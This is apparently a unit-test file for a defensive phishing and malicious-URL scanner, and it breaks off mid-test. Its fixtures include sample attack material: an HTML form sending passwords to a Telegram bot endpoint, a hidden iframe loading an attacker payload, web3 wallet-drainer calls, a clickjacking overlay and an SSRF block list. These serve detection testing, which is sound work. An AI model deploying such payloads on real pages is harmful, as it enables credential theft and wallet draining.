from django.test import TestCase
from bs4 import BeautifulSoup
from unittest.mock import patch, MagicMock

from service.url_checks.common import (
    decode_obfuscated_ip,
    extract_and_audit_userinfo,
    refang_url,
    defang_url,
)
from service.url_checks.redirect_chain import (
    unpack_nested_url_parameters,
    is_blocked_ssrf_ip,
    analyze_redirect_chain,
)
from service.url_checks.structure import (
    analyze_idn_homographs,
    analyze_url_structure,
)
from service.url_checks.sandbox_preview import (
    audit_dom_forms,
    analyze_sandbox_preview,
)


class Pillar1UrlExposingTests(TestCase):
    """
    Unit tests for Pillar 1: Total URL Exposing & De-obfuscation (UT-P1.1 to UT-P1.10).
    """

    def test_ut_p1_1_base64_nested_parameter_unrolling(self):
        """UT-P1.1: Base64/nested parameter unwrap extracts target URL."""
        test_url = "https://site.com/?dest=aHR0cHM6Ly9ldmlsLnh5eg=="
        final_url, unpacked_trail = unpack_nested_url_parameters(test_url)
        self.assertEqual(final_url, "https://evil.xyz")
        self.assertEqual(len(unpacked_trail), 1)
        self.assertEqual(unpacked_trail[0]['param'], 'dest')
        self.assertEqual(unpacked_trail[0]['encoding'], 'BASE64')
        self.assertEqual(unpacked_trail[0]['extractedUrl'], 'https://evil.xyz')

    @patch('service.url_checks.redirect_chain.requests.get')
    def test_ut_p1_2_meta_refresh_traversal(self, mock_get):
        """UT-P1.2: Meta-refresh tag traversal jumps across non-3xx hops."""
        # First hop returns HTML with meta-refresh
        first_resp = MagicMock()
        first_resp.url = "https://landing-page.com"
        first_resp.status_code = 200
        first_resp.headers = {'content-type': 'text/html'}
        first_resp.text = '<html><head><meta http-equiv="refresh" content="0; url=https://bad.com"></head></html>'
        first_resp.raw.read.return_value = b'<html><head><meta http-equiv="refresh" content="0; url=https://bad.com"></head></html>'

        # Second hop is target
        second_resp = MagicMock()
        second_resp.url = "https://bad.com"
        second_resp.status_code = 200
        second_resp.headers = {'content-type': 'text/html'}
        second_resp.text = '<html><body>Logged in</body></html>'
        second_resp.raw.read.return_value = b'<html><body>Logged in</body></html>'

        mock_get.side_effect = [first_resp, second_resp]

        findings = []
        result = analyze_redirect_chain("https://landing-page.com", "landing-page.com", findings)
        self.assertEqual(result['finalUrl'], "https://bad.com")
        self.assertTrue(any(h.get('hopType') == 'META_REFRESH' for h in result['hops']))

    def test_ut_p1_3_ssrf_ip_guard(self):
        """UT-P1.3: SSRF guard halts and flags AWS metadata and loopback IPs."""
        self.assertTrue(is_blocked_ssrf_ip("169.254.169.254"))
        self.assertTrue(is_blocked_ssrf_ip("127.0.0.1"))
        self.assertTrue(is_blocked_ssrf_ip("10.0.0.1"))
        self.assertTrue(is_blocked_ssrf_ip("192.168.1.1"))
        self.assertFalse(is_blocked_ssrf_ip("8.8.8.8"))
        self.assertFalse(is_blocked_ssrf_ip("1.1.1.1"))

    def test_ut_p1_4_dword_numeric_ip_decoding(self):
        """UT-P1.4: 32-bit unsigned integer (Dword) IP decoding (2130706433 -> 127.0.0.1)."""
        decoded, fmt = decode_obfuscated_ip("2130706433")
        self.assertEqual(decoded, "127.0.0.1")
        self.assertEqual(fmt, "DWORD")

    def test_ut_p1_5_octal_numeric_ip_decoding(self):
        """UT-P1.5: POSIX octal IP decoding with leading zeros (0177.0.0.1 -> 127.0.0.1)."""
        decoded, fmt = decode_obfuscated_ip("0177.0.0.1")
        self.assertEqual(decoded, "127.0.0.1")
        self.assertEqual(fmt, "DOTTED_OCTAL")

        # Mixed base hex/octal test
        decoded_hex, fmt_hex = decode_obfuscated_ip("0x7f.0.0.1")
        self.assertEqual(decoded_hex, "127.0.0.1")
        self.assertEqual(fmt_hex, "DOTTED_HEX")

    def test_ut_p1_6_userinfo_deception_attack(self):
        """UT-P1.6: Deceptive userinfo RFC 3986 spoofing detection."""
        url = "https://paypal.com:login@evil-drop.com/verify"
        audit = extract_and_audit_userinfo(url)
        self.assertTrue(audit['flagged'])
        self.assertEqual(audit['cleanHost'], "evil-drop.com")
        self.assertIn("paypal.com", audit['deceptivePrefix'])

    def test_ut_p1_7_exfiltration_sink_detection(self):
        """UT-P1.7: Form submitting credentials to Telegram Bot API is flagged."""
        html = """
        <html>
            <body>
                <form action="https://api.telegram.org/bot12345/sendMessage" method="POST">
                    <input type="text" name="username">
                    <input type="password" name="password">
                    <button type="submit">Submit</button>
                </form>
            </body>
        </html>
        """
        soup = BeautifulSoup(html, 'html.parser')
        findings = []
        audit = audit_dom_forms(soup, "https://benign-landing.com/login", findings)
        self.assertEqual(len(audit['exfiltrationSinks']), 1)
        self.assertEqual(audit['exfiltrationSinks'][0]['sinkType'], "TELEGRAM_BOT_API")
        self.assertTrue(any(f['type'] == 'EXFILTRATION_SINK_DETECTED' for f in findings))

    def test_ut_p1_8_hidden_iframe_detection(self):
        """UT-P1.8: Zero-pixel hidden iframe detection."""
        html = """
        <html>
            <body>
                <iframe src="https://attacker.com/payload" width="0" height="0"></iframe>
            </body>
        </html>
        """
        soup = BeautifulSoup(html, 'html.parser')
        hidden_iframes = []
        for iframe in soup.find_all('iframe'):
            src = iframe.get('src') or ''
            w = (iframe.get('width') or '').strip()
            h = (iframe.get('height') or '').strip()
            style = (iframe.get('style') or '').lower()
            if w == '0' or h == '0' or 'display: none' in style or 'display:none' in style:
                hidden_iframes.append({'src': src, 'reason': 'zero dimensions'})

        self.assertEqual(len(hidden_iframes), 1)
        self.assertEqual(hidden_iframes[0]['src'], "https://attacker.com/payload")

    def test_ut_p1_9_idn_mixed_script_homograph(self):
        """UT-P1.9: Cyrillic/Latin mixed-script IDN homograph detection."""
        # xn--pple-43d.com is Cyrillic 'а' + Latin 'pple.com'
        result = analyze_idn_homographs("xn--pple-43d.com")
        self.assertTrue(result['isIdn'])
        self.assertTrue(result['hasMixedScript'])
        self.assertIn('Cyrillic', result['scriptHistogram'])
        self.assertIn('Latin', result['scriptHistogram'])
        self.assertTrue(len(result['confusableGlyphs']) > 0)
        self.assertEqual(result['confusableGlyphs'][0]['asciiReplacement'], 'a')

    def test_ut_p1_10_refang_and_defang_url(self):
        """UT-P1.10: Re-fanging bracketed indicators and defanging safe exports."""
        defanged_input = "hxxps[://]attacker[.]com/login"
        refanged = refang_url(defanged_input)
        self.assertEqual(refanged, "https://attacker.com/login")

        # Roundtrip defang
        safe_exported = defang_url("https://malicious.org/download.exe")
        self.assertEqual(safe_exported, "hxxps[://]malicious[.]org/download.exe")


class Pillar2ThreatIntelResiliencyTests(TestCase):
    """
    Unit tests for Pillar 2: Multi-Engine Threat Intelligence & Zero-Panic Resiliency (UT-2.1 to UT-2.6).
    """

    def setUp(self):
        from rest_framework.test import APIClient
        self.client = APIClient()

    @patch('service.views.threat_intel_manager.evaluate')
    @patch('service.views.analyze_url_structure')
    def test_ut_2_1_missing_google_api_key_no_panic(self, mock_structure, mock_ti):
        """UT-2.1: Missing Google API key continues pipeline with 200 OK (no HTTP 500 panic)."""
        mock_ti.return_value = {
            'isThreat': False,
            'consensusScore': 0,
            'evaluatedEnginesCount': 3,
            'healthyEnginesCount': 1,
            'evaluationDegraded': False,
            'threatTypes': [],
            'engines': [
                {'name': 'Google Safe Browsing', 'status': 'NOT_CONFIGURED', 'isThreat': False},
                {'name': 'URLhaus', 'status': 'HEALTHY', 'isThreat': False},
            ],
        }
        mock_structure.return_value = {
            'findings': [],
            'isIpBased': False,
            'hasSuspiciousTld': False,
            'hasTyposquattingSignal': False,
            'hasNewDomainRisk': False,
            'hasRedirectRisk': False,
            'sandboxPreview': {'riskScore': 0},
        }

        resp = self.client.post('/api/check-url/', {'url': 'https://example.com'}, format='json')
        self.assertEqual(resp.status_code, 200)
        self.assertIn('threatIntel', resp.data)
        self.assertEqual(resp.data['verdict'], 'SAFE')

    @patch('service.url_checks.threat_intel.google_safe_browsing.requests.post')
    def test_ut_2_2_google_quota_exceeded_rate_limited(self, mock_post):
        """UT-2.2: Google Safe Browsing HTTP 429 returns RATE_LIMITED without raising exception."""
        from service.url_checks.threat_intel import GoogleSafeBrowsingEngine, EngineStatus
        mock_resp = MagicMock()
        mock_resp.status_code = 429
        mock_post.return_value = mock_resp

        engine = GoogleSafeBrowsingEngine(api_key='fake_key')
        res = engine.evaluate('https://example.com')
        self.assertEqual(res.status, EngineStatus.RATE_LIMITED)
        self.assertFalse(res.is_threat)
        self.assertIn('quota exceeded', res.error_message.lower())

    @patch('service.url_checks.threat_intel.urlhaus.requests.post')
    def test_ut_2_3_network_timeout_clean_handling(self, mock_post):
        """UT-2.3: Upstream network timeout handled cleanly with TIMEOUT status."""
        import requests
        from service.url_checks.threat_intel import URLhausEngine, EngineStatus
        mock_post.side_effect = requests.exceptions.Timeout("Connection timed out")

        engine = URLhausEngine()
        res = engine.evaluate('https://example.com')
        self.assertEqual(res.status, EngineStatus.TIMEOUT)
        self.assertFalse(res.is_threat)

    @patch('service.url_checks.threat_intel.urlhaus.requests.post')
    def test_ut_2_4_known_malware_urlhaus(self, mock_post):
        """UT-2.4: Known malware cataloged on URLhaus sets is_threat=True and high confidence."""
        from service.url_checks.threat_intel import URLhausEngine, EngineStatus
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            'query_status': 'ok',
            'threat': 'malware_download',
            'url_status': 'online',
            'reporter': 'abuse_ch',
        }
        mock_post.return_value = mock_resp

        engine = URLhausEngine()
        res = engine.evaluate('https://malware-drop.com/bad.exe')
        self.assertEqual(res.status, EngineStatus.HEALTHY)
        self.assertTrue(res.is_threat)
        self.assertIn('URLHAUS_MALWARE_DOWNLOAD', res.threat_types)

    def test_ut_2_5_all_feeds_disconnected_evaluation_degraded(self):
        """UT-2.5: All feeds returning unavailable degrades gracefully without crashing."""
        from service.url_checks.threat_intel import ThreatIntelManager, EngineResult, EngineStatus
        manager = ThreatIntelManager()
        e1 = MagicMock()
        e1.name = 'Google Safe Browsing'
        e1.evaluate.return_value = EngineResult(engine_name='Google Safe Browsing', status=EngineStatus.UNAVAILABLE)
        e2 = MagicMock()
        e2.name = 'URLhaus'
        e2.evaluate.return_value = EngineResult(engine_name='URLhaus', status=EngineStatus.UNAVAILABLE)

        with patch.object(manager, '_get_engines', return_value=[e1, e2]):
            summary = manager.evaluate('https://offline-test.com')
            self.assertTrue(summary['evaluationDegraded'])
            self.assertEqual(summary['healthyEnginesCount'], 0)
            self.assertFalse(summary['isThreat'])

    def test_ut_2_6_repeated_url_scan_ttl_cache(self):
        """UT-2.6: Repeated URL scan is served directly from TTL cache."""
        from service.url_checks.threat_intel import ThreatIntelManager, EngineResult, EngineStatus
        manager = ThreatIntelManager(cache_ttl=60)
        e1 = MagicMock()
        e1.name = 'URLhaus'
        e1.evaluate.return_value = EngineResult(engine_name='URLhaus', status=EngineStatus.HEALTHY, is_threat=False)

        with patch.object(manager, '_get_engines', return_value=[e1]):
            url = 'https://cached-target.com'
            first_res = manager.evaluate(url)
            self.assertEqual(e1.evaluate.call_count, 1)

            # Second call should hit cache and not call evaluate again
            second_res = manager.evaluate(url)
            self.assertEqual(e1.evaluate.call_count, 1)
            self.assertEqual(first_res, second_res)


class Pillar3InfrastructureTests(TestCase):
    """
    Unit tests for Pillar 3: Infrastructure, Network & DNS Threat Evaluation (UT-3.1 to UT-3.6).
    """

    @patch('service.url_checks.infrastructure.dns_audit.query_doh')
    def test_ut_3_1_fast_flux_network_detection(self, mock_doh):
        """UT-3.1: Host with low TTL (<60s) and multiple distinct subnets is flagged as FAST_FLUX_NETWORK."""
        from service.url_checks.infrastructure import audit_dns_and_flux
        mock_doh.return_value = [
            {'name': 'flux.site', 'type': 1, 'TTL': 20, 'data': '192.168.1.10'},
            {'name': 'flux.site', 'type': 1, 'TTL': 20, 'data': '192.168.1.11'},
            {'name': 'flux.site', 'type': 1, 'TTL': 20, 'data': '10.20.1.12'},
        ]
        findings = []
        res = audit_dns_and_flux('flux.site', findings)
        self.assertTrue(res['isFastFlux'])
        self.assertEqual(res['minTtl'], 20)
        self.assertTrue(any(f['type'] == 'FAST_FLUX_NETWORK' for f in findings))

    @patch('service.url_checks.infrastructure.dns_audit.query_doh', return_value=[])
    def test_ut_3_2_dynamic_dns_risk(self, mock_doh):
        """UT-3.2: Host on known Dynamic DNS provider is flagged."""
        from service.url_checks.infrastructure import audit_dns_and_flux
        findings = []
        res = audit_dns_and_flux('victim-login.duckdns.org', findings)
        self.assertTrue(res['isDynamicDns'])
        self.assertTrue(any(f['type'] == 'DYNAMIC_DNS_RISK' for f in findings))

    @patch('service.url_checks.infrastructure.dns_audit.query_doh', return_value=[])
    def test_ut_3_3_reverse_tunnel_risk(self, mock_doh):
        """UT-3.3: Host on reverse tunneling provider is flagged."""
        from service.url_checks.infrastructure import audit_dns_and_flux
        findings = []
        res = audit_dns_and_flux('my-payload.ngrok-free.app', findings)
        self.assertTrue(res['isTunnel'])
        self.assertTrue(any(f['type'] == 'REVERSE_TUNNEL_RISK' for f in findings))

    @patch('service.url_checks.infrastructure.dns_audit.query_doh')
    def test_ut_3_4_brand_spoof_no_mx(self, mock_doh):
        """UT-3.4: Brand impersonating domain with no MX records is flagged as BRAND_SPOOF_NO_MX."""
        from service.url_checks.infrastructure import audit_mx_records
        mock_doh.return_value = []  # No MX records
        findings = []
        res = audit_mx_records('paypal-security-update.com', 'paypal', findings)
        self.assertFalse(res['hasMx'])
        self.assertTrue(any(f['type'] == 'BRAND_SPOOF_NO_MX' for f in findings))

    @patch('service.url_checks.infrastructure.ssl_deep.socket.create_connection')
    @patch('service.url_checks.infrastructure.ssl_deep.ssl.create_default_context')
    def test_ut_3_5_very_recent_ssl_cert(self, mock_ctx_fn, mock_conn):
        """UT-3.5: Certificate issued < 24 hours ago is flagged as VERY_RECENT_SSL_CERT."""
        from datetime import datetime, timezone, timedelta
        from service.url_checks.infrastructure import deep_audit_ssl

        # Mock notBefore 3 hours ago
        recent_date = datetime.now(timezone.utc) - timedelta(hours=3)
        not_before_str = recent_date.strftime('%b %d %H:%M:%S %Y GMT')

        mock_sock = MagicMock()
        mock_ssock = MagicMock()
        mock_ssock.getpeercert.return_value = {
            'notBefore': not_before_str,
            'issuer': [((('organizationName', "Let's Encrypt"),),)],
            'subjectAltName': [('DNS', 'phish-target.com')],
        }

        mock_ctx = MagicMock()
        mock_ctx.wrap_socket.return_value.__enter__.return_value = mock_ssock
        mock_ctx_fn.return_value = mock_ctx
        mock_conn.return_value.__enter__.return_value = mock_sock

        findings = []
        res = deep_audit_ssl('phish-target.com', 'chase', findings)
        self.assertTrue(res['sslActive'])
        self.assertTrue(res['isVeryRecent'])
        self.assertTrue(res['isFreeDv'])
        self.assertLess(res['certAgeHours'], 24.0)
        self.assertTrue(any(f['type'] == 'VERY_RECENT_SSL_CERT' for f in findings))
        self.assertTrue(any(f['type'] == 'FREE_SSL_ON_BRAND_LURE' for f in findings))

    def test_ut_3_6_offline_infrastructure_degraded(self):
        """UT-3.6: Complete DNS/ASN/SSL failure degrades gracefully with zero panic."""
        from service.url_checks.infrastructure import InfrastructureManager
        manager = InfrastructureManager(timeout=0.2)

        with patch('service.url_checks.infrastructure.manager.audit_dns_and_flux', side_effect=Exception('DNS down')), \
             patch('service.url_checks.infrastructure.manager.audit_mx_records', side_effect=Exception('MX down')), \
             patch('service.url_checks.infrastructure.manager.lookup_asn_info', side_effect=Exception('ASN down')), \
             patch('service.url_checks.infrastructure.manager.deep_audit_ssl', side_effect=Exception('SSL down')):

            findings = []
            res = manager.evaluate(
                hostname='unreachable-host.example',
                registered_domain='unreachable-host.example',
                findings=findings,
            )
            self.assertIn('dns', res)
            self.assertIn('asn', res)
            self.assertFalse(res['asn']['available'])
            self.assertFalse(res['dns']['isFastFlux'])


class Pillar5DeepDomPayloadTests(TestCase):
    """
    Unit tests for Pillar 5: Deep DOM, Form Action & Payload Inspection (UT-5.1 to UT-5.7).
    """

    def test_ut_5_1_insecure_http_password_form(self):
        """UT-5.1: Password field over unencrypted HTTP scheme flags INSECURE_HTTP_CREDENTIAL_FORM."""
        from service.url_checks.dom_inspection import audit_credential_harvesters
        html = "<html><body><form><input type='password' name='pwd'></form></body></html>"
        soup = BeautifulSoup(html, 'html.parser')
        findings = []
        res = audit_credential_harvesters(soup, "http://insecure-bank.org/login", "insecure-bank.org", findings)
        self.assertTrue(res['isHttpLogin'])
        self.assertTrue(any(f['type'] == 'INSECURE_HTTP_CREDENTIAL_FORM' for f in findings))

    def test_ut_5_2_excessive_identity_harvesting(self):
        """UT-5.2: Form requesting SSN and CVV flags EXCESSIVE_IDENTITY_HARVESTING."""
        from service.url_checks.dom_inspection import audit_credential_harvesters
        html = """
        <html><body>
            <form>
                <input type="text" name="user_ssn" placeholder="Social Security Number">
                <input type="text" name="card_cvv" placeholder="CVV Security Code">
            </form>
        </body></html>
        """
        soup = BeautifulSoup(html, 'html.parser')
        findings = []
        res = audit_credential_harvesters(soup, "https://steal-identity.xyz/verify", "steal-identity.xyz", findings)
        self.assertIn('SSN', res['sensitiveInputsFound'])
        self.assertIn('CVV', res['sensitiveInputsFound'])
        self.assertTrue(any(f['type'] == 'EXCESSIVE_IDENTITY_HARVESTING' for f in findings))

    def test_ut_5_3_clickjacking_overlay_trap(self):
        """UT-5.3: Transparent overlay with elevated z-index flags CLICKJACKING_OVERLAY_TRAP."""
        from service.url_checks.dom_inspection import audit_clickjacking_overlays
        html = '<html><body><div id="trap" style="opacity: 0; z-index: 99999; position: fixed; width: 100%; height: 100%;"></div></body></html>'
        soup = BeautifulSoup(html, 'html.parser')
        findings = []
        res = audit_clickjacking_overlays(soup, findings)
        self.assertTrue(res['hasClickjackingOverlays'])
        self.assertEqual(res['overlayCount'], 1)
        self.assertTrue(any(f['type'] == 'CLICKJACKING_OVERLAY_TRAP' for f in findings))

    def test_ut_5_4_web3_blind_eth_sign_drainer(self):
        """UT-5.4: Script invoking eth_sign flags WEB3_BLIND_SIGN_DRAINER."""
        from service.url_checks.dom_inspection import audit_web3_signatures
        html = """
        <html><body>
            <script>
                async function drain() {
                    await window.ethereum.request({ method: 'eth_sign', params: [addr, hash] });
                }
            </script>
        </body></html>
        """
        soup = BeautifulSoup(html, 'html.parser')
        findings = []
        res = audit_web3_signatures(soup, findings)
        self.assertTrue(res['hasWeb3DrainerSignatures'])
        self.assertIn('ETH_SIGN', res['detectedSignatures'])
        self.assertTrue(any(f['type'] == 'WEB3_BLIND_SIGN_DRAINER' for f in findings))

    def test_ut_5_5_web3_nft_approval_drainer(self):
        """UT-5.5: Script invoking setApprovalForAll flags WEB3_PERMIT2_ALLOWANCE_DRAINER."""
        from service.url_checks.dom_inspection import audit_web3_signatures
        html = """
        <html><body>
            <script>
                const tx = contract.setApprovalForAll(operatorAddress, true);
            </script>
        </body></html>
        """
        soup = BeautifulSoup(html, 'html.parser')
        findings = []
        res = audit_web3_signatures(soup, findings)
        self.assertTrue(res['hasWeb3DrainerSignatures'])
        self.assertIn('NFT_SET_APPROVAL', res['detectedSignatures'])
        self.assertTrue(any(f['type'] == 'WEB3_PERMIT2_ALLOWANCE_DRAINER' for f in findings))

    def test_ut_5_6_double_extension_deception(self):
        """UT-5.6: Attachment with double extension like report.pdf.exe flags DOUBLE_EXTENSION_DECEPTION."""
        from service.url_checks.dom_inspection import audit_download_payloads
        headers = {'content-disposition': 'attachment; filename="Quarterly_Statement_2026.pdf.exe"'}
        findings = []
        res = audit_download_payloads(None, headers, "https://payload.drop/file", findings)
        self.assertTrue(res['isDoubleExtension'])
        self.assertTrue(res['isExecutableDownload'])
        self.assertEqual(res['downloadFilename'], 'Quarterly_Statement_2026.pdf.exe')
        self.assertTrue(any(f['type'] == 'DOUBLE_EXTENSION_DECEPTION' for f in findings))

    def test_ut_5_7_dangerous_executable_mime_download(self):
        """UT-5.7: application/x-msdownload content-type flags DANGEROUS_EXECUTABLE_DOWNLOAD."""
        from service.url_checks.dom_inspection import audit_download_payloads
        headers = {'content-type': 'application/x-msdownload'}
        findings = []
        res = audit_download_payloads(None, headers, "https://payload.drop/setup.bin", findings)
        self.assertTrue(res['isExecutableDownload'])
        self.assertTrue(any(f['type'] == 'DANGEROUS_EXECUTABLE_DOWNLOAD' for f in findings))


class Pillar4DynamicSandboxTests(TestCase):
    """
    Unit tests for Pillar 4: Dynamic Headless Sandboxing & Visual Threat Detection (UT-4.1 to UT-4.5).
    """

    @patch('service.url_checks.dynamic_sandbox.differential_probing._probe_url')
    def test_ut_4_1_anti_analysis_cloaking_status_mismatch(self, mock_probe):
        """UT-4.1: Desktop 404 vs Mobile 200 flags ANTI_ANALYSIS_CLOAKING_DETECTED."""
        from service.url_checks.dynamic_sandbox import audit_multi_vantage_cloaking

        def side_effect(url, headers, timeout=1.8):
            ua = headers.get('User-Agent', '')
            if 'iPhone' in ua:
                return {'status': 200, 'length': 45000, 'snippet': 'Login', 'error': None}
            elif 'outlook.live.com' in headers.get('Referer', ''):
                return {'status': 200, 'length': 45000, 'snippet': 'Login', 'error': None}
            else:
                return {'status': 404, 'length': 200, 'snippet': 'Not Found', 'error': '404'}

        mock_probe.side_effect = side_effect
        findings = []
        res = audit_multi_vantage_cloaking("https://cloaked-phish.xyz", findings)
        self.assertTrue(res['cloakingDetected'])
        self.assertEqual(res['discrepancyType'], 'STATUS_MISMATCH')
        self.assertTrue(any(f['type'] == 'ANTI_ANALYSIS_CLOAKING_DETECTED' for f in findings))

    def test_ut_4_2_visual_brand_impersonation_unauthorized_domain(self):
        """UT-4.2: Microsoft 365 visual clone on unauthorized domain flags CRITICAL_VISUAL_BRAND_IMPERSONATION."""
        from service.url_checks.dynamic_sandbox import evaluate_visual_impersonation, BRAND_HASH_CATALOG
        ms_hash = BRAND_HASH_CATALOG['Microsoft 365']['phash']
        findings = []
        res = evaluate_visual_impersonation(ms_hash, "evil-login.xyz", findings)
        self.assertTrue(res['detected'])
        self.assertEqual(res['impersonatedBrand'], 'Microsoft 365')
        self.assertFalse(res['isAuthorizedDomain'])
        self.assertGreaterEqual(res['similarityScore'], 0.99)
        self.assertTrue(any(f['type'] == 'CRITICAL_VISUAL_BRAND_IMPERSONATION' for f in findings))

    def test_ut_4_3_visual_brand_impersonation_authorized_domain(self):
        """UT-4.3: Microsoft 365 visual clone on legitimate microsoftonline.com domain is clean."""
        from service.url_checks.dynamic_sandbox import evaluate_visual_impersonation, BRAND_HASH_CATALOG
        ms_hash = BRAND_HASH_CATALOG['Microsoft 365']['phash']
        findings = []
        res = evaluate_visual_impersonation(ms_hash, "login.microsoftonline.com", findings)
        self.assertFalse(res['detected'])
        self.assertTrue(res['isAuthorizedDomain'])
        self.assertFalse(any(f['type'] == 'CRITICAL_VISUAL_BRAND_IMPERSONATION' for f in findings))

    def test_ut_4_4_background_exfiltration_telemetry(self):
        """UT-4.4: Background exfiltration to Telegram captured during dynamic evaluation."""
        from service.url_checks.dynamic_sandbox import DynamicSandboxManager
        manager = DynamicSandboxManager()

        mock_worker_result = {
            'available': True,
            'executed': True,
            'error': None,
            'hydratedHtml': '<html><body>Dynamic SPA</body></html>',
            'screenshotDataUri': None,
            'interceptedRequests': [{'url': 'https://api.telegram.org/bot1/send', 'method': 'POST'}],
            'suspiciousExfiltrations': [{'url': 'https://api.telegram.org/bot1/send', 'sinkType': 'TELEGRAM_BOT_API'}],
        }

        with patch.object(manager.worker, 'run_sandbox_session', return_value=mock_worker_result), \
             patch('service.url_checks.dynamic_sandbox.manager.audit_multi_vantage_cloaking', return_value={'cloakingDetected': False}):

            findings = []
            res = manager.evaluate("https://dynamic-drop.org", "dynamic-drop.org", findings)
            self.assertTrue(res['headlessWorkerExecuted'])
            self.assertEqual(len(res['networkHarvester']['suspiciousBackgroundExfiltration']), 1)
            self.assertTrue(any(f['type'] == 'EXFILTRATION_SINK_DETECTED' for f in findings))

    def test_ut_4_5_playwright_missing_graceful_degradation(self):
        """UT-4.5: Missing/offline Playwright degrades gracefully without throwing errors."""
        from service.url_checks.dynamic_sandbox import DynamicSandboxManager
        manager = DynamicSandboxManager()

        # Mock is_available returning False
        with patch.object(manager.worker, 'is_available', return_value=False), \
             patch('service.url_checks.dynamic_sandbox.manager.audit_multi_vantage_cloaking', return_value={'cloakingDetected': False}):

            findings = []
            res = manager.evaluate("https://offline-playwright.org", "offline-playwright.org", findings)
            self.assertFalse(res['headlessWorkerExecuted'])
            self.assertFalse(res['screenshot']['available'])
            self.assertIn('executionTimeMs', res)


class Pillar7DeveloperApiTests(TestCase):
    """
    Unit tests for Pillar 7: Developer API Platform, Key Management & MongoDB Usage Tracking
    (UT-M.1 to UT-M.7).
    """

    def setUp(self):
        from service.mongo import MongoDBClient
        MongoDBClient.reset_for_tests()

    def test_ut_m_1_mongodb_client_and_mock_fallback(self):
        """UT-M.1: MongoDB client connects or cleanly falls back to mongomock."""
        from service.mongo import MongoDBClient
        db = MongoDBClient.get_db()
        self.assertIsNotNone(db)
        # Verify collection access works
        self.assertEqual(db.api_keys.count_documents({}), 0)

    def test_ut_m_2_api_key_creation_and_hashing(self):
        """UT-M.2 & UT-M.3: API key creation stores SHA-256 hash and returns raw secret once."""
        from service.mongo import create_api_key_for_user, authenticate_api_key
        doc, raw_secret = create_api_key_for_user('user_123', 'Test Key')

        self.assertTrue(raw_secret.startswith('zeb_live_'))
        self.assertNotIn('key_hash', raw_secret)
        self.assertEqual(doc['name'], 'Test Key')
        self.assertEqual(doc['key_prefix'], raw_secret[:16])

        # Test authentication
        auth_doc = authenticate_api_key(raw_secret)
        self.assertIsNotNone(auth_doc)
        self.assertEqual(auth_doc['name'], 'Test Key')

        # Bad key fails authentication
        self.assertIsNone(authenticate_api_key('zeb_live_invalid_key_1234567890'))
        self.assertIsNone(authenticate_api_key('not_even_prefixed'))

    def test_ut_m_3_minute_burst_rate_limiting(self):
        """UT-M.4: Minute burst rate limit triggers when requests exceed limit."""
        from service.mongo import (
            MongoDBClient,
            create_api_key_for_user,
            check_quota_and_rate_limit,
            record_usage_log,
        )
        doc, raw_secret = create_api_key_for_user('user_456', 'Burst Test', daily_quota=1000, rate_limit=5)
        db = MongoDBClient.get_db()
        key_doc = db.api_keys.find_one({'key_prefix': doc['key_prefix']})

        # Insert 5 logs
        for _ in range(5):
            record_usage_log(key_doc, 'https://test.com', 200, 50)

        # 6th check should fail
        allowed, msg = check_quota_and_rate_limit(key_doc)
        self.assertFalse(allowed)
        self.assertIn('Rate limit exceeded', msg)

    def test_ut_m_4_daily_quota_exhaustion(self):
        """UT-M.5: Daily quota ceiling blocks requests when exhausted."""
        from service.mongo import (
            MongoDBClient,
            create_api_key_for_user,
            check_quota_and_rate_limit,
            record_usage_log,
        )
        doc, raw_secret = create_api_key_for_user('user_789', 'Quota Test', daily_quota=3, rate_limit=100)
        db = MongoDBClient.get_db()
        key_doc = db.api_keys.find_one({'key_prefix': doc['key_prefix']})

        for _ in range(3):
            record_usage_log(key_doc, 'https://test.com', 200, 50)

        allowed, msg = check_quota_and_rate_limit(key_doc)
        self.assertFalse(allowed)
        self.assertIn('Daily quota of 3 requests exhausted', msg)

    def test_ut_m_5_developer_scan_endpoint_unauthorized(self):
        """UT-M.6: POST /api/v1/scan returns 401 when X-API-Key is missing or invalid."""
        # Missing key
        resp = self.client.post('/api/v1/scan', {'url': 'https://github.com'}, content_type='application/json')
        self.assertEqual(resp.status_code, 401)

        # Invalid key
        resp = self.client.post(
            '/api/v1/scan',
            {'url': 'https://github.com'},
            content_type='application/json',
            HTTP_X_API_KEY='zeb_live_nonexistent_key',
        )
        self.assertEqual(resp.status_code, 401)

    @patch('service.url_checks.threat_intel.google_safe_browsing.GoogleSafeBrowsingEngine.evaluate')
    @patch('service.url_checks.threat_intel.virustotal.VirusTotalEngine.evaluate')
    def test_ut_m_6_third_party_api_isolation(self, mock_vt, mock_gsb):
        """UT-M.7: Developer scan strictly isolates commercial third-party APIs (GSB/VT never called)."""
        from service.mongo import create_api_key_for_user
        doc, raw_secret = create_api_key_for_user('user_iso', 'Isolation Key')

        resp = self.client.post(
            '/api/v1/scan',
            {'url': 'https://example.com'},
            content_type='application/json',
            HTTP_X_API_KEY=raw_secret,
        )

        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(data['canonicalUrl'], 'https://example.com')
        self.assertIn('engineNotice', data)
        self.assertIn('Third-party commercial APIs omitted', data['engineNotice'])

        # Critical assertion: Commercial APIs were NEVER called
        mock_gsb.assert_not_called()
        mock_vt.assert_not_called()


class SandboxPreviewRegressionTests(TestCase):
    """
    Regression tests for analyze_sandbox_preview ensuring no NameError: page_registered
    and verifying consistent dictionary return structures for HTML and non-HTML payloads.
    """

    @patch('service.url_checks.sandbox_preview.requests.get')
    def test_analyze_sandbox_preview_html_evaluation_success(self, mock_get):
        """Verify analyze_sandbox_preview evaluates HTML pages without NameError: page_registered."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.headers = {'content-type': 'text/html; charset=utf-8'}
        mock_resp.url = 'https://secure-login.example.com/login'
        mock_resp.text = (
            '<html><head><title>Sign In</title></head><body>'
            '<form action="/auth" method="POST">'
            '<input type="text" name="username">'
            '<input type="password" name="password">'
            '<input type="text" name="ssn">'
            '</form>'
            '</body></html>'
        )
        mock_resp.history = []
        mock_get.return_value = mock_resp

        findings = []
        res = analyze_sandbox_preview('https://secure-login.example.com/login', findings)

        self.assertTrue(res['available'])
        self.assertTrue(res['htmlAnalyzed'])
        self.assertEqual(res['fetchedUrl'], 'https://secure-login.example.com/login')
        self.assertIn('payloadInspection', res)
        self.assertIn('credentialHarvester', res['payloadInspection'])
        self.assertIn('linkXRay', res)
        self.assertIn('forms', res['linkXRay'])

    @patch('service.url_checks.sandbox_preview.requests.get')
    def test_analyze_sandbox_preview_non_html_response(self, mock_get):
        """Verify analyze_sandbox_preview handles non-HTML content with fallback keys."""
        mock_resp = MagicMock()
